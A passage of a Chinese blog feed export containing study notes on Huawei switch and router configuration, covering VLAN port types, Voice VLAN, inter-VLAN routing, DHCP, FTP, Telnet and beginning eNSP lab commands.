&lt;type&gt;</code> ,type可以配置为Access ,Trunk或Hybrid。需要注意的是，如果查看端口配置时没有发现端口类型信息，说明端口使用了默认的hybrid端口链路类型。当修改端口类型时，必须先恢复端口的默认VLAN配置，使端口属于缺省的VLAN 1</p><h3 id="2-13-添加端口到VLAN"><a href="#2-13-添加端口到VLAN" class="headerlink" title="2.13 添加端口到VLAN"></a>2.13 添加端口到VLAN</h3><p>可以使用两种方法把端口加入到VLAN</p><ol><li>第一种方法是进入到VLAN视图，执行<code>port &lt;interface&gt;</code>命令，把端口加入VLAN</li><li>第二种方法是进入到接口视图，执行<code>port default vlan &lt;vlan-id&gt;</code>命令，把端口加入VLAN。vlan-id是指端口要加入的VLAN</li></ol><h3 id="2-14-配置Trunk端口"><a href="#2-14-配置Trunk端口" class="headerlink" title="2.14 配置Trunk端口"></a>2.14 配置Trunk端口</h3><ul><li><p>配置Trunk时，应先使用<code>port link-type trunk</code>命令修改端口的类型为Trunk，然后再配置Trunk端口允许哪些VLAN的数据帧通过</p></li><li><p>执行<code>port trunk allow-pass vlan</code> <em>{ { vlan-id1 [ to vlan-id2] }|al }</em> 命令，可以配置端口允许的VLAN,all表示允许所有VLAN的数据帧通过</p></li><li><p>执行<code>port trunk pvid vlan vlan-id</code>命令，可以修改Trunk端口的PVID。修改Trunk端口的PVID之后，需要注意∶缺省VLAN不一定是端口允许通过的VLAN。只有使用命令<code>porttrunk allow-pass vlan</code> <em>{ { vlan-id1 [ to vlan-id2] } | all }</em> 允许缺省VLAN数据通过，才能转发缺省VLAN的数据帧。交换机的所有端口默认允许VLAN1的数据通过</p></li><li><p>在本示例中</p><p><img src="https://pic.imgdb.cn/item/60f631165132923bf8ef047d.png"></p><p>将SWA的GO/0/1端口配置为Trunk端口，该端口PVID默认为1。配置<code>porttrunk allow-pass vlan2 3</code>命令之后，该Trunk允许VLAN 2和VLAN 3的数据流量通过</p></li></ul><h3 id="2-15-配置Hybrid端口"><a href="#2-15-配置Hybrid端口" class="headerlink" title="2.15 配置Hybrid端口"></a>2.15 配置Hybrid端口</h3><p>案例：</p><p><img src="https://pic.imgdb.cn/item/60f631535132923bf8efb9df.png"></p><ol><li><code>port link-type hybrid</code>命令的作用是将端口的类型配置为Hybrid。默认情况下，X7系列交换机的端口类型是Hybrid。因此，只有在把Access口或Trunk口配置成Hybrid时，才需要执行此命令</li><li><code>port hybrid tagged vlan</code> <em>{ { vlan-id1 [ to vlan-id2] } | all }</em> 命令用来配置允许哪些VLAN的数据帧以Tagged方式通过该端口</li><li><code>port hybrid untagged vlan</code> <em>{ { vlan-id1 [ to vlan-id2] } | all }</em> 命令用来配置允许哪些VLAN的数据帧以Untagged方式通过该端口。</li><li>在本示例中，要求主机A和主机B都能访问服务器，但是它们之间不能互相访问。此时通过命令<code>port link-type hybrid</code>配置交换机连接主机和服务器的端口，以及交换机互连的端口都为Hybrid类型。通过命令<code>port hybrid pvid vlan 2</code>配置交换机连接主机A的端口的PVID是2。类似地，连接主机B的端口的PVID是3，连接服务器的端口的PVID是100。</li><li>通过在G0/0/1端口下使用命令<code>port hybrid tagged vlan 2 3 100</code>，配置VLAN2,VLAN3和VLAN100的数据帧在通过该端口时都携带标签。在G0/0/2端口下使用命令<code>port hybriduntagged vlan 2 100</code>，配置VLAN2和VLAN100的数据帧在通过该端口时都不携带标签。在G0/0/3端口下使用命令<code>port hybrid untagged vlan 3 100</code>，配置VLAN3和VLAN100的数据帧在通过该端口时都不携带标签</li><li>在SWB上继续进行配置，在G0/0/1端口下使用命令<code>port link-type hybrid</code>配置端口类型为Hybrid</li><li>在G0/0/1端口下使用命令<code>port hybrid tagged vlan 2 3 100</code>，配置VLAN2，VLAN3和VLAN100的数据帧在通过该端口时都携带标签</li><li>在G0/0/2端口下使用命令<code>port hybrid untagged vlan 2 3 100</code>，配置VLAN2，VLAN3和VLAN100的数据帧在通过该端口时都不携带标签</li></ol><h3 id="2-16-Voice-VLAN-应用"><a href="#2-16-Voice-VLAN-应用" class="headerlink" title="2.16 Voice VLAN 应用"></a>2.16 Voice VLAN 应用</h3><ul><li>随着IP网络的融合，TCP/IP网络可以为高速上网HSI (High Speed Internet )业务、VoIP( Voice over IP)业务、IPTV ( Internet Protocol Television )业务提供服务</li><li>语音数据在传输时需要具有比其他业务数据更高的优先级，以减少传输过程中可能产生的时延和丢包现象</li><li>为了区分语音数据流，可在交换机上部署Voice VLAN功能，把VoIP的电话流量进行VLAN隔离，并配置更高的优先级，从而能够保证通话质量</li></ul><h3 id="2-17-配置Voice-VLAN"><a href="#2-17-配置Voice-VLAN" class="headerlink" title="2.17 配置Voice VLAN"></a>2.17 配置Voice VLAN</h3><ul><li><p>执行<code>voice-vlan &lt;vlan-id&gt; enable</code>命令，可以把VLAN 2到VLAN 4094之间的任一VLAN配置成语音VLAN</p></li><li><p>执行<code>voice-vlan mode &lt;mode&gt;</code>命令，可以配置端口加入语音VLAN的模式</p></li><li><p>端口加入Voice VLAN的模式有两种：</p><ol><li><p>自动模式︰使能Voice VLAN功能的端口根据进入端口的数据流中的源MAC地址字段来判断该数据流是否为语音数据流。源MAC地址符合系统设置的语音设备OUI<br>( Organizationally Unique Identifier )地址的报文认为是语音数据流。接收到语音数据流的端口将自动加入Voice VLAN中传输，并通过老化机制维护Voice VLAN内的端口数量</p></li><li><p>手动模式：当接口使能Voice VLAN功能后，必须通过手工将连接语音设备的端口加入或退出Voice VLAN中，这样才能保证Voice VLAN功能生效</p></li></ol></li><li><p>执行<code>voice-vlan mac-address mac-address mask oui-mask</code> <em>[ description text ]</em> 命令，用来配置Voice VLAN的OU地址。OUI地址表示一个MAC地址段。交换机将48位的MAC地址和掩码的对应位做“与”运算可以确定出OU地址。接入设备的MAC地址和OUI地址匹配的位数，由掩码中全“1”的长度决定。例如，MAC地址为0001-0001-0001，掩码为FFFF-FFOO-0000，那么将MAC地址与其相应掩码位执行“与”运算的结果就是OU地址0001-0000-0000。只要接入设备的MAC地址前24位和OUI地址的前24位匹配，那么使能Voice VLAN功能的端口将认为此数据流是语音数据流，接入的设备是语音设备</p></li></ul><h3 id="2-18-验证配置2"><a href="#2-18-验证配置2" class="headerlink" title="2.18 验证配置2"></a>2.18 验证配置2</h3><ul><li>执行<code>display voice-vlan status</code>命令，可以查看语音VLAN的信息，包括状态、工作模式、老化时间、以及使能了语音VLAN功能的端口信息</li><li><strong>Add-Mode</strong>字段表明语音VLAN的添加模式。自动模式中，使能了语音VLAN功能后，端口可以自动加入到语音VLAN。如果语音设备发送的报文的MAC地址匹配了OUI，连接该语音设备的端口也会加入语音VLAN。如果在老化时间内，端口没有收到语音设备的任何语音数据报文，端口自动会被删除。手动模式中，在端口上使能了语音VLAN功能之后，必须手动把端口添加到语音VLAN中</li><li><strong>Security-Mode</strong>字段表示Voice VLAN端口的工作模式，有两种：<ol><li>正常模式：可以传输语音数据和业务数据，但是容易受到恶意数据流量的攻击</li><li>安全模式：只允许传输语音数据流。安全模式可以防止Voice VLAN受到恶意数据流量的攻击，但是检查报文的工作会占用一定的系统资源</li></ol></li><li><strong>Legacy</strong>字段表明端口是否开启与其他厂商语音设备互通的功能，Enable表示开启，Disable表示关闭</li></ul><h2 id="3-VLAN间路由"><a href="#3-VLAN间路由" class="headerlink" title="3. VLAN间路由"></a>3. VLAN间路由</h2><h3 id="3-1-VLAN的局限性"><a href="#3-1-VLAN的局限性" class="headerlink" title="3.1 VLAN的局限性"></a>3.1 VLAN的局限性</h3><p>VLAN隔离了二层广播域，也严格地隔离了各个VLAN之间的任何二层流量，属于不同VLAN的用户之间不能进行二层通信</p><h3 id="3-2-VLAN路由"><a href="#3-2-VLAN路由" class="headerlink" title="3.2 VLAN路由"></a>3.2 VLAN路由</h3><ol><li><p>每个VLAN一个物理连接</p><p>因为不同VLAN之间的主机是无法实现二层通信的，所以必须通过三层路由才能将报文从一个VLAN转发到另外一个VLAN</p><p>解决VLAN间通信问题的第一种方法是：</p><ul><li>在路由器上为每个VLAN分配一个单独的接口，并使用一条物理链路连接到二层交换机上。当VLAN间的主机需要通信时，数据会经由路由器进行三层路由，并被转发到目的VLAN内的主机，这样就可以实现VLAN之间的相互通信。然而，随着每个交换机上VLAN数量的增加，这样做必然需要大量的路由器接口，而路由器的接口数量是极其有限的。并且，某些VLAN之间的主机可能不需要频繁进行通信，如果这样配置的话，会导致路由器的接口利用率很低。因此，实际应用中一般不会采用这种方案来解决VLAN间的通信问题。</li></ul></li><li><p>单臂路由</p><ul><li><p>解决VLAN间通信问题的第二种方法是：</p></li><li><p>在交换机和路由器之间仅使用一条物理链路连接。在交换机上，把连接到路由器的端口配置成Trunk类型的端口，并允许相关VLAN的帧通过。在路由器上需要创建子接口，逻辑上把连接路由器的物理链路分成了多条。一个子接口代表了一条归属于某个VLAN的逻辑链路。配置子接口时，需要注意以下几点：</p><ol><li>必须为每个子接口分配一个IP地址。该IP地址与子接口所属VLAN位于同一网段</li><li>需要在子接口上配置802.1Q封装，来剥掉和添加VLAN Tag，从而实现VLAN间互通</li><li>在子接口上执行命令arp broadcast enable使能子接口的ARP广播功能。</li></ol></li><li><p>本例中</p><p><img src="https://pic.imgdb.cn/item/60f6342a5132923bf8f81de7.png"></p><p>主机A发送数据给主机B时，RTA会通过G0/0/1.1子接口收到此数据，然后查找路由表，将数据从G0/0/1.2子接口发送给主机B，这样就实现了VLAN2和VLAN3之间的主机通信</p></li></ul></li><li><p>三层交换</p><ul><li>解决VLAN间通信问题的第三种方法是：</li><li>在三层交换机上配置VLANIF接口来实现VLAN间路由。如果网络上有多个VLAN，则需要给每个VLAN配置一个VLANIF接口，并给每个VLANIF接口配置一个IP地址。用户设置的缺省网关就是三层交换机中VLANIF接口的IP地址</li></ul></li></ol><h3 id="3-3-配置单臂路由"><a href="#3-3-配置单臂路由" class="headerlink" title="3.3 配置单臂路由"></a>3.3 配置单臂路由</h3><ul><li>执行<code>port link-type trunk</code>命令，配置SWA的G0/0/1端口为Trunk类型的端口</li><li>执行<code>port trunk allow-pass vlan 2 3</code>命令，配置SWA的G0/0/1端口允许VLAN 2和VLAN 3的数据通过</li><li><code>interface</code> <em>interface-type interface-number.sub-interface number</em> 命令用来创建子接口。<em>sub-interface number</em> 代表物理接口内的逻辑接口通道</li><li><code>dot1q termination vid</code>命令用来配置子接口dot1q封装的单层VLAN ID。缺省情况，子接口没有配置dot1q封装的单层VLAN ID。本命令执行成功后，终结子接口对报文的处理如下:接收报文时，剥掉报文中携带的Tag后进行三层转发。转发出去的报文是否带Tag由出接口决定。发送报文时，将相应的VLAN信息添加到报文中再发送</li><li><code>arp broadcast enable</code>命令用来使能终结子接口的ARP广播功能。缺省情况下，终结子接口没有使能ARP广播功能。终结子接口不能转发广播报文，在收到广播报文后它们直接把该报文丢弃。为了允许终结子接口能转发广播报文，可以通过在子接口上执行此命令</li></ul><p>最后使用ping进行验证主机之间的连通性</p><h3 id="3-4-配置三层交换"><a href="#3-4-配置三层交换" class="headerlink" title="3.4 配置三层交换"></a>3.4 配置三层交换</h3><p><img src="https://pic.imgdb.cn/item/60f6355d5132923bf8fba353.png"></p><ol><li>在三层交换机上配置VLAN路由时，首先创建VLAN，并将端口加入到VLAN中</li><li><code>interface vlanif vlan-id</code>命令用来创建VLANIF接口并进入到VLANIF接口视图。vlan-id表示与VLANIF接口相关联的VLAN编号。VLANIF接口的IP地址作为主机的网关IP地址，和主机的IP地址必须位于同一网段</li></ol><p>最后使用ping进行验证</p>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>交换技术的进阶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DHCP,FTP,Telnet原理与配置</title>
    <link href="/2021/07/19/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/IP%E4%B8%9A%E5%8A%A1%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/DHCP,FTP,Telnet%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/07/19/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/IP%E4%B8%9A%E5%8A%A1%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/DHCP,FTP,Telnet%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="DHCP-FTP-Telnet原理与配置"><a href="#DHCP-FTP-Telnet原理与配置" class="headerlink" title="DHCP,FTP,Telnet原理与配置"></a>DHCP,FTP,Telnet原理与配置</h1><h2 id="1-DHCP原理与配置"><a href="#1-DHCP原理与配置" class="headerlink" title="1. DHCP原理与配置"></a>1. DHCP原理与配置</h2><h3 id="1-1-DHCP应用场景"><a href="#1-1-DHCP应用场景" class="headerlink" title="1.1 DHCP应用场景"></a>1.1 DHCP应用场景</h3><ul><li>在大型企业网络中，一般会有大量的主机等终端设备。每个终端都需要配置IP地址等网络参数才能接入网络。在小型网络中，终端数量很少，可以手动配置IP地址。但是在大中型网络中，终端数量很多，手动配置IP地址工作量大，而且配置时容易导致IP地址冲突等错误</li><li>DHCP可以为网络终端动态分配IP地址，解决了手工配置IP地址时的各种问题</li></ul><h3 id="1-2-DHCP报文类型"><a href="#1-2-DHCP报文类型" class="headerlink" title="1.2 DHCP报文类型"></a>1.2 DHCP报文类型</h3><p><img src="https://pic.imgdb.cn/item/60f59dda5132923bf8721726.png"></p><ol><li>DHCP客户端初次接入网络时，会发送DHCP发现报文(DHCP Discover )，用于查找和定位DHCP服务器</li><li>DHCP服务器在收到DHCP发现报文后，发送DHCP提供报文(DHCP Offer )，此报文中包含IP地址等配置信息</li><li>在DHCP客户端收到服务器发送的DHCP提供报文后，会发送DHCP请求报文(DHCPRequest)，另外在DHCP客户端获取IP地址并重启后，同样也会发送DHCP请求报文，用于确认分配的IP地址等配置信息。DHCP客户端获取的IP地址租期快要到期时，也发送DHCP请求报文向服务器申请延长IP地址租期</li><li>收到DHCP客户端发送的DHCP请求报文后，DHCP服务器会回复DHCP确认报文(DHCPACK)。客户端收到DHCP确认报文后，会将获取的IP地址等信息进行配置和使用</li><li>如果DHCP服务器收到DHCP-REQUEST报文后，没有找到相应的租约记录，则发送DHCP-NAK报文作为应答，告知DHCP客户端无法分配合适IP地址</li><li>DHCP客户端通过发送DHCP释放报文(DHCP Release )来释放IP地址。收到DHCP释放报文后，DHCP服务器可以把该IP地址分配给其他DHCP客户端</li></ol><h3 id="1-3-地址池"><a href="#1-3-地址池" class="headerlink" title="1.3 地址池"></a>1.3 地址池</h3><ul><li>ARG3系列路由器和X7系列交换机都可以作为DHCP服务器，为主机等设备分配IP地址。DHCP服务器的地址池是用来定义分配给主机的IP地址范围，有两种形式<ol><li>接口地址池为连接到同一网段的主机或终端分配IP地址。可以在服务器的接口下执行<code>dhcpselect interface</code>命令，配置DHCP服务器采用接口地址池的DHCP服务器模式为客户端分配IP地址</li><li>全局地址池为所有连接到DHCP服务器的终端分配IP地址。可以在服务器的接口下执行<code>dhcp select global</code>命令，配置DHCP服务器采用全局地址池的DHCP服务器模式为客户端分配IP地址</li></ol></li><li>接口地址池的优先级比全局地址池高。配置了全局地址池后，如果又在接口上配置了地址池，客户端将会从接口地址池中获取IP地址。在X7系列交换机上，只能在VLANIF逻辑接口上配置接口地址池</li></ul><h3 id="1-4-DHCP工作原理"><a href="#1-4-DHCP工作原理" class="headerlink" title="1.4 DHCP工作原理"></a>1.4 DHCP工作原理</h3><p><img src="https://pic.imgdb.cn/item/60f59e845132923bf875d1c9.png"></p><ul><li>为了获取IP地址等配置信息，DHCP客户端需要和DHCP服务器进行报文交互</li><li>首先，DHCP客户端发送DHCP发现报文来发现DHCP服务器。DHCP服务器会选取一个未分配的IP地址，向DHCP客户端发送DHCP提供报文。此报文中包含分配给客户端的IP地址和其他配置信息。如果存在多个DHCP服务器，每个DHCP服务器都会响应</li><li>如果有多个DHCP服务器向DHCP客户端发送DHCP提供报文，DHCP客户端将会选择收到的第一个DHCP提供报文，然后发送DHCP请求报文，报文中包含请求的IP地址。收到DHCP请求报文后，提供该IP地址的DHCP服务器会向DHCP客户端发送一个DHCP确认报文，包含提供的IP地址和其他配置信息。DHCP客户端收到DHCP确认报文后，会发送免费ARP报文，检查网络中是否有其他主机使用分配的IP地址。如果指定时间内没有收到ARP应答，DHCP客户端会使用这个IP地址。如果有主机使用该IP地址，DHCP客户端会向DHCP服务器发送DHCP拒绝报文，通知服务器该IP地址已被占用。然后DHCP客户端会向服务器重新申请一个IP地址</li></ul><h3 id="1-4-DHCP租期更新"><a href="#1-4-DHCP租期更新" class="headerlink" title="1.4 DHCP租期更新"></a>1.4 DHCP租期更新</h3><p>申请到P地址后，DHCP客户端中会保存三个定时器，分别用来控制租期更新，租期重绑定和租期失效。DHCP服务器为DHCP客户端分配IP地址时会指定三个定时器的值。如果DHCP服务器没有指定定时器的值，DHCP客户端会使用缺省值，缺省租期为1天。默认情况下，还剩下50%的租期时，DHCP客户端开始租约更新过程，DHCP客户端向分配IP地址的服务器发送DHCP请求报文来申请延长IP地址的租期。DHCP服务器向客户端发送DHCP确认报文，给予DHCP客户端一个新的租期</p><h3 id="1-5-DHCP重绑定"><a href="#1-5-DHCP重绑定" class="headerlink" title="1.5 DHCP重绑定"></a>1.5 DHCP重绑定</h3><ul><li>DHCP客户端发送DHCP请求报文续租时，如果DHCP客户端没有收到DHCP服务器的DHCP应答报文。默认情况下，重绑定定时器在租期剩余12.5%的时候超时，超时后，DHCP客户端会认为原DHCP服务器不可用，开始重新发送DHCP请求报文。网络上任何一台DHCP服务器都可以应答DHCP确认或DHCP非确认报文</li><li>如果收到DHCP确认报文，DHCP客户端重新进入绑定状态，复位租期更新定时器和重绑定定时器。如果收到DHCP非确认报文，DHCP客户端进入初始化状态。此时，DHCP客户端必须立刻停止使用现有IP地址，重新申请IP地址</li></ul><h3 id="1-6-IP地址释放"><a href="#1-6-IP地址释放" class="headerlink" title="1.6 IP地址释放"></a>1.6 IP地址释放</h3><p>租期定时器是地址失效进程中的最后一个定时器，超时时间为IP地址的租期时间。如果DHCP客户端在租期失效定时器超时前没有收到服务器的任何回应，DHCP客户端必须立刻停止使用现有IP地址，发送DHCP Release报文，并进入初始化状态。然后，DHCP客户端重新发送DHCP发现报文，申请IP地址</p><h3 id="1-7-DHCP接口地址池配置"><a href="#1-7-DHCP接口地址池配置" class="headerlink" title="1.7 DHCP接口地址池配置"></a>1.7 DHCP接口地址池配置</h3><ul><li>DHCP支持配置两种地址池，包括全局地址池和接口地址池</li><li><code>dhcp enable</code>命令用来使能DHCP功能。在配置DHCP服务器时，必须先执行<code>dhcp enable</code>命令，才能配置DHCP的其他功能并生效</li><li><code>dhcp select interface</code>命令用来关联接口和接口地址池，为连接到接口的主机提供配置信息。在本示例中，接口GigabitEthernet 0/0/0被加入接口地址池中</li><li><code>dhcp server dns-list</code>命令用来指定接口地址池下的DNS服务器地址</li><li><code>dhcp server excluded-ip-address</code>命令用来配置接口地址池中不参与自动分配的IP地址范围</li><li><code>dhcp server lease</code>命令用来配置DHCP服务器接口地址池中IP地址的租用有效期限功能。缺省情况下，接口地址池中IP地址的租用有效期限为1天。</li></ul><h3 id="1-8-配置验证"><a href="#1-8-配置验证" class="headerlink" title="1.8 配置验证"></a>1.8 配置验证</h3><p><img src="https://pic.imgdb.cn/item/60f59f5f5132923bf87aabfd.png"></p><p>每个DHCP服务器可以定义一个或多个全局地址池和接口地址池。本例中执行<code>display ippool</code>命令查看接口地址池的属性。display信息中包含地址池的IP地址范围，还包括IP网关，子网掩码等信息。</p><h3 id="1-9-DHCP全局地址池配置"><a href="#1-9-DHCP全局地址池配置" class="headerlink" title="1.9 DHCP全局地址池配置"></a>1.9 DHCP全局地址池配置</h3><p><img src="https://pic.imgdb.cn/item/60f59f935132923bf87bfced.png"></p><p>在本示例中，配置了一个DHCP全局地址池 </p><ol><li><code>ip pool</code>命令用来创建全局地址池</li><li><code>network</code>命令用来配置全局地址池下可分配的网段地址</li><li><code>gateway-list</code>命令用来配置DHCP服务器全局地址池的出口网关地址</li><li><code>lease</code>命令用来配置DHCP全局地址池下的地址租期。缺省情况下，IP地址租期是1天</li><li><code>dhcp select global</code>命令用来使能接口的DHCP服务器功能。</li></ol><h3 id="1-10-配置验证2"><a href="#1-10-配置验证2" class="headerlink" title="1.10 配置验证2"></a>1.10 配置验证2</h3><p><code>display ip pool</code>命令可以查看全局IP地址池信息。管理员可以查看地址池的网关、子网掩码、IP地址统计信息等内容，监控地址池的使用情况，了解已分配的IP地址数量，以及其他使用统计信息</p><h2 id="2-FTP原理与配置"><a href="#2-FTP原理与配置" class="headerlink" title="2. FTP原理与配置"></a>2. FTP原理与配置</h2><p><img src="https://pic.imgdb.cn/item/60f61f8d5132923bf8bf3d81.png"></p><p>FTP提供了一种在服务器和客户机之间上传和下载文件的有效方式</p><h3 id="2-1-FTP传输文件的过滤"><a href="#2-1-FTP传输文件的过滤" class="headerlink" title="2.1 FTP传输文件的过滤"></a>2.1 FTP传输文件的过滤</h3><ul><li>使用FTP进行文件传输时，会使用两个TCP连接。第一个连接是FTP客户端和FTP服务器间的控制连接。FTP服务器开启21号端口，等待FTP客户端发送连接请求。FTP客户端随机开启端口，向服务器发送建立连接的请求。控制连接用于在服务器和客户端之间传输控制命令</li><li>第二个连接是FTP客户端和FTP服务器间的数据连接。服务器使用TCP的20号端口与客户端建立数据连接。通常情况下，服务器主动建立或中断数据连接</li></ul><h3 id="2-2-FTP传输模式"><a href="#2-2-FTP传输模式" class="headerlink" title="2.2 FTP传输模式"></a>2.2 FTP传输模式</h3><ul><li>FTP传输数据时支持两种传输模式∶ASCIl模式和二进制模式<ol><li>ASCI模式用于传输文本。发送端的字符在发送前被转换成ASCII码格式之后进行传输，接收端收到之后再将其转换成字符</li><li>二进制模式常用于发送图片文件和程序文件。发送端在发送这些文件时无需转换格式，即可传输</li></ol></li></ul><h3 id="2-3-FTP配置"><a href="#2-3-FTP配置" class="headerlink" title="2.3 FTP配置"></a>2.3 FTP配置</h3><ul><li>ARG3系列路由器和X7系列交换机均可提供FTP功能</li><li>执行<code>ftp server enable</code>命令使能FTP功能</li><li>执行<code>set default ftp-directory</code>命令设置FTP用户的默认工作目录</li><li>在配置FTP服务器时，可以使用AAA为每个用户分别配置登录账号和访问权限</li><li><code>aaa</code>命令用来进入AAA视图。</li><li><code>local-user</code> <em>user-name { access-limit max-number | ftp-directory directory | idle-timeout minutes [ seconds ] / password cipher password [ opt ]<br>l privilege level level| state {active | block }}</em>  *命令用来创建本地用户，并配置本地用户的各项参数</li><li><code>user-name</code>指定用户名</li><li><code>local-user huawei service-type ftp</code>命令用来配置本地用户的接入类型为ftp</li><li><code>ftp-directory</code>指定FTP用户可访问的目录。如果不配置FTP用户可访问的目录，则FTP用户无法登录设备</li><li><code>access-limit</code>指定用户名可建立的最大连接数目</li><li><code>idle-timeout</code>指定用户的闲置超时时间</li><li><code>privilege level</code>指定用户的优先级</li><li><code>ftp</code>命令用来与远程FTP服务器建立控制连接，并进入FTP客户端视图</li><li><code>binary</code>命令用来在设备作为FTP客户端时设置文件传输方式为Binary模式，又称二进制模式</li><li>缺省情况下，文件传输方式为ASCII模式</li><li><code>get</code>命令用来从远程FTP服务器下载文件并保存在本地</li></ul><h2 id="3-Telnet-原理与配置"><a href="#3-Telnet-原理与配置" class="headerlink" title="3. Telnet 原理与配置"></a>3. Telnet 原理与配置</h2><p>Telnet可以通过终端对本地和远程的网络设备进行集中管理</p><p>Telnet提供了一个交互式操作界面，允许终端远程登录到任何可以充当Telnet服务器的设备</p><p>Telnet用户可以像通过Console口本地登录一样对设备进行操作</p><p>远端TeInet服务器和终端之间无需直连，只需保证两者之间可以互相通信即可</p><p>通过使用Telnet，用户可以方便的实现对设备进行远程管理和维护</p><h3 id="3-1-Telnet连接"><a href="#3-1-Telnet连接" class="headerlink" title="3.1 Telnet连接"></a>3.1 Telnet连接</h3><p>Telnet以客户端/服务器模式运行</p><p>Telnet基于TCP协议，服务器端口号默认是23，服务器通过该端口与客户端建立Telnet连接</p><h3 id="3-2-认证模式"><a href="#3-2-认证模式" class="headerlink" title="3.2 认证模式"></a>3.2 认证模式</h3><ul><li>在配置Telnet登录用户界面时，必须配置认证方式，否则用户无法成功登录设备</li><li>Telnet认证有两种模式:AAA模式，密码模式<ol><li>当配置用户界面的认证方式为AAA时，用户登录设备时需要首先输入登录用户名和密码才能登录</li><li>当配置用户界面的认证方式为password时，用户登录设备时需要首先输入登录密码才能登录</li></ol></li></ul><h3 id="3-3-Telnet配置"><a href="#3-3-Telnet配置" class="headerlink" title="3.3 Telnet配置"></a>3.3 Telnet配置</h3><ul><li>网络设备作为Telnet服务器，通常使用密码认证机制来认证连接到VTY接口的用户</li><li>VTY (Virtual Type Terminal )是网络设备用来管理和监控通过Telnet方式登录的用户的界面。网络设备为每个Telnet用户分配一个VTY界面</li><li>缺省情况下，ARG3系列路由器支持的Telnet用户最大数目为5个，VTY04的含义是VTYo，VTY1，VTY2,VTY3，VTY4。如果需要增加Telnet用户的登录数量，可以使用<code>user-interface maximum-vty</code>命令来调整VTY界面的数量。</li><li>执行<code>authentication-mode password</code>命令，可以配置VTY通过密码对用户进行认证</li><li>注︰不同VRP版本执行<code>set authentication password cipher</code>命令有差异∶有些平台需要回车后输入密码，另外一些平台可直接在命令后输入密码。故在操作具体产品时请查阅相应VRP产品文档</li><li>远端设备配置为Telnet服务器之后，可以在客户端上执行telnet命令来与服务器建立Telnet连接。客户端会收到需要认证相关的提示信息，用户输入的认证密码需要匹配TeInet服务器上保存的密码。认证通过之后，用户就可以通过Telnet远程连接到Telnet服务器上，在本地对远端的设备进行配置和管理</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>IP业务基础介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实验总结</title>
    <link href="/2021/07/19/eNSP/%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    <url>/2021/07/19/eNSP/%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><h2 id="实验一-搭建基础IP网络"><a href="#实验一-搭建基础IP网络" class="headerlink" title="实验一 搭建基础IP网络"></a>实验一 搭建基础IP网络</h2><ol><li>首先需要将相关软件安装</li><li>每个具体的设备需要启动</li><li>实验中进入pc端的设置界面设置ip即可</li></ol><h2 id="实验二-设备基础配置"><a href="#实验二-设备基础配置" class="headerlink" title="实验二 设备基础配置"></a>实验二 设备基础配置</h2><p>本节中实验介绍相关的命令</p><ol><li><p>查看系统信息</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">display</span> <span class="hljs-keyword">version</span><br></code></pre></div></td></tr></table></figure></li><li><p>修改系统时间</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">clock</span> timezone Local add <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">clock</span> datetime <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">2021</span>-<span class="hljs-number">7</span>-<span class="hljs-number">7</span><br><br><span class="hljs-attribute">display</span> clock<br></code></pre></div></td></tr></table></figure><p>最后命令查看系统时间</p></li><li><p>系统输入命令时，问号是通配符，Tab键是自动补全命令的快捷键</p></li><li><p>进入系统视图</p><figure class="highlight gauss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gauss"><span class="hljs-keyword">system</span>-<span class="hljs-built_in">view</span><br></code></pre></div></td></tr></table></figure></li><li><p>修改设备名称</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">sysname</span> R<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure></li><li><p>设置登录信息</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">header</span></span> shell information <span class="hljs-string">&quot;welcome&quot;</span><br></code></pre></div></td></tr></table></figure></li><li><p>配置Console口参数</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入对应端口<br>user-interface console <span class="hljs-number">0</span><br># 设置密码<br>authentication-<span class="hljs-built_in">mode</span> password<br><span class="hljs-built_in">set</span> authentication password cipher<br># 设置未操作退出时间<br>idle-timeout <span class="hljs-number">20</span> <span class="hljs-number">0</span><br># 查看配置结果<br>display 